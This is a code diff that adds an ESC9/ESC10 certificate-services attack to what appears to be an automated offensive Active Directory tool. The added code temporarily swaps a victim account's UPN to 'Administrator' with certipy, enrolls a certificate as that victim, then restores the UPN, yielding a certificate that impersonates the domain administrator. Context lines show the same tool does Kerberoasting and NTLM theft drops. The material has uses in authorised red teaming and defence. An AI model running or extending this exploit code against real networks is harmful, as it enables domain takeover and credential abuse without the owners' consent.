@@ -52,7 +52,7 @@ from typing import Optional
 # Configuration
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-VERSION = "4.3.2"
+VERSION = "4.4.0"
 TOOLS_DIR = Path("/opt/tools")
 CVE_DIR = TOOLS_DIR / "CVE-2025-33073"
 
@@ -138,6 +138,8 @@ class Config:
     # AD CS options
     no_adcs: bool = False
     ca_name: str = ""
+    esc_victim_user: str = ""      # ESC9/ESC10 victim — UPN-swap target
+    esc_victim_password: str = ""
 
     # Roasting options
     no_roast: bool = False
@@ -3579,6 +3581,80 @@ def _certihound_find(cfg: Config) -> Optional[dict]:
 # AD CS Exploitation (ESC1-ESC16 via certipy; ESC5/ESC17 detection-only)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
+def _adcs_esc9_esc10_attack(template: str, ca_name: str, esc_type: str,
+                            cfg: Config, pfx_stem: Path,
+                            pfx_path: Path) -> Optional[str]:
+    """ESC9/ESC10 UPN-swap attack — bypasses CVE-2022-26923 SID binding.
+
+    Requires a victim account whose UPN we can write. Caller controls
+    the victim via --esc-victim USER:PASS. Always restores UPN in finally.
+    """
+    if not cfg.esc_victim_user or not cfg.esc_victim_password:
+        log.warning(f"  {esc_type} requires --esc-victim USER:PASS (controllable account)")
+        detail("  Hint: pick a user you have GenericWrite on, or whose password you reset")
+        return None
+
+    victim = cfg.esc_victim_user
+    victim_pwd = cfg.esc_victim_password
+    log.info(f"  Exploiting {esc_type} via UPN swap: victim={victim} → impersonate Administrator")
+
+    # Caller's own creds (used for the LDAP UPN write; presupposes WriteProperty on victim)
+    auth_args = ["-u", f"{cfg.username}@{cfg.domain}", "-dc-ip", cfg.dc_ip]
+    if cfg.nthash:
+        auth_args += ["-hashes", f":{cfg.nthash}"]
+    else:
+        auth_args += ["-p", cfg.password]
+
+    # 1. Read original UPN so we can restore it
+    read_cmd = ["certipy", "account"] + auth_args + ["-user", victim, "read"]
+    read_result = run(read_cmd, cfg, timeout=60)
+    orig_upn_match = re.search(r"userPrincipalName\s*:\s*(\S+)", read_result.stdout or "")
+    orig_upn = orig_upn_match.group(1) if orig_upn_match else ""
+    detail(f"  Original UPN of {victim}: {orig_upn or '<unset>'}")
+
+    # 2. Swap UPN to "Administrator" (sAMAccountName form, no @domain)
+    log.info(f"  Setting {victim}.userPrincipalName = Administrator")
+    swap_cmd = ["certipy", "account"] + auth_args + [
+        "-user", victim, "-upn", "Administrator", "update"
+    ]
+    swap_result = run(swap_cmd, cfg, timeout=60)
+    if swap_result.returncode != 0:
+        log.warning(f"  {esc_type}: Failed to update UPN — need WriteProperty on {victim}")
+        return None
+
+    pfx = None
+    try:
+        # 3. Enroll cert as victim (uses victim's password, not ours)
+        log.info(f"  Enrolling cert as {victim}@{cfg.domain} via template '{template}'...")
+        enroll_cmd = [
+            "certipy", "req",
+            "-u", f"{victim}@{cfg.domain}", "-p", victim_pwd,
+            "-dc-ip", cfg.dc_ip,
+            "-ca", ca_name, "-template", template,
+            "-out", str(pfx_stem)
+        ]
+        enroll_result = run(enroll_cmd, cfg, timeout=120)
+        if enroll_result.returncode == 0 and pfx_path.exists():
+            ok(f"  {esc_type}: Cert enrolled as {victim} with SAN=Administrator")
+            pfx = str(pfx_path)
+        else:
+            log.warning(f"  {esc_type}: Cert enrollment failed")
+    finally:
+        # 4. ALWAYS restore UPN — even on exception, even if enrollment failed
+        log.info(f"  Restoring {victim}.userPrincipalName")
+        restore_cmd = ["certipy", "account"] + auth_args + [
+            "-user", victim, "-upn", orig_upn or "", "update"
+        ]
+        restore_result = run(restore_cmd, cfg, timeout=60)
+        if restore_result.returncode == 0:
+            ok(f"  {esc_type}: UPN restored to '{orig_upn or '<unset>'}'")
+        else:
+            log.error(f"  {esc_type}: FAILED TO RESTORE UPN — manually set "
+                      f"{victim}.userPrincipalName = '{orig_upn}'")
+
+    return pfx
+
+
 def _adcs_exploit_template(template: str, ca_name: str, esc_type: str,
                            cfg: Config) -> Optional[str]:
     """Exploit a vulnerable AD CS template. Returns PFX path on success, None on failure."""
@@ -3637,6 +3713,17 @@ def _adcs_exploit_template(template: str, ca_name: str, esc_type: str,
                 log.error(f"  ESC4: Cannot restore — {old_config} not found! Template may be modified!")
 
         return pfx
+
+    elif esc_type in ("ESC9", "ESC10"):
+        # ESC9: template has CT_FLAG_NO_SECURITY_EXTENSION (no SID ext in cert)
+        # ESC10: DC has weak cert mapping (StrongCertificateBindingEnforcement=0
+        #        or CertificateMappingMethods has 0x4/UPN flag)
+        # Both bypass CVE-2022-26923 by relying on UPN-based KDC mapping:
+        #   1. Swap a victim user's UPN to "Administrator"
+        #   2. Enroll cert as victim → cert SAN = "Administrator"
+        #   3. Restore UPN
+        #   4. PKINIT — KDC has no SID to bind against, falls back to UPN match
+        return _adcs_esc9_esc10_attack(template, ca_name, esc_type, cfg, pfx_stem, pfx_path)
 
     elif esc_type == "ESC7":
         # CA officer abuse — enable SubCA template, request, approve
@@ -5510,6 +5597,9 @@ def parse_args() -> Config:
     adv = p.add_argument_group("Advanced attacks")
     adv.add_argument("--no-adcs", action="store_true", help="Skip AD CS exploitation")
     adv.add_argument("--ca-name", default="", help="Certificate Authority name (auto-detected)")
+    adv.add_argument("--esc-victim", default="",
+                     help="ESC9/ESC10 UPN-swap victim as USER:PASS (account you have "
+                          "WriteProperty on); enables CVE-2022-26923 bypass")
     adv.add_argument("--no-roast", action="store_true", help="Skip Kerberoasting / AS-REP Roasting")
     adv.add_argument("--no-ntlm-theft", action="store_true",
                      help="Skip NTLM theft file drops on writable shares")
@@ -5568,6 +5658,8 @@ def parse_args() -> Config:
         payload_url=args.payload_url,
         no_adcs=args.no_adcs,
         ca_name=args.ca_name,
+        esc_victim_user=(args.esc_victim.split(":", 1)[0] if args.esc_victim else ""),
+        esc_victim_password=(args.esc_victim.split(":", 1)[1] if ":" in args.esc_victim else ""),
         no_roast=args.no_roast,
         no_ntlm_theft=args.no_ntlm_theft,
         no_sccm=args.no_sccm,
